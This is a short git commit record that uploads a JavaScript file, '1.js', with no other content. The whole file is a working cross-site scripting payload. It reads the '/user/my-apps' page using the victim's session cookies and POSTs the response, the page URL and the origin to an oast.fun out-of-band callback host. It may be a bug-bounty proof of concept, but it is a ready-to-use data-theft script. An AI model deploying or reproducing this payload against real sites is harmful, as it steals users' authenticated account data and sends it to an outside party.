e2f940a52c993cbe2eb89607c5b3f10a0da54366
eaglesteppe <56231146+eaglesteppe@users.noreply.github.com>
2026-09-11 20:28:50 +0500

    Add files via upload

---
+++ 1.js
@@ -0,0 +1,18 @@
+(async () => {
+  try {
+    const res = await fetch('/user/my-apps', { credentials: 'include' });
+    const data = await res.text();
+
+    await fetch('https://hsrjvzfyftnlzigkbkplqcrzy9etsscvd.oast.fun', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({
+        url: location.href,
+        origin: location.origin,
+        response: data
+      })
+    });
+  } catch (error) {
+    console.error('An error occurred:', error);
+  }
+})();
